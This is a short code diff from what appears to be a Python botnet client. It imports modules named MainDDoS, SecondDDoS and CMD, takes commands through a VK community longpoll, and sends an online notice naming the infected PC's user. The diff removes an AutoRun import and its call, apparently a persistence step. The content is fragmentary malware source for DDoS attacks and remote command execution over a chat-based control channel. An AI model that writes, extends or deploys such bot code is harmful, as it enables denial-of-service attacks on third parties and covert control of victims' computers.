@@ -2,7 +2,6 @@ from MainDDoS import mainDDoS
 from SecondDDoS import secondDDoS
 from POSTGET import message
 from CMD import cmd
-from AutoRun import AutoRun
 from vk_api import VkApi
 from vk_api.utils import get_random_id
 from vk_api.longpoll import VkLongPoll, VkEventType
@@ -17,7 +16,6 @@ longpoll = VkLongPoll(vk_session) # Longpoll makes that community recive message
 
 
 name = getuser() # Name = name of your PC
-AutoRun()
 
 message("Новый пользователь в сети, введите логин и пароль или введите '""Check""' для активации бота") # Notification about running programm
 
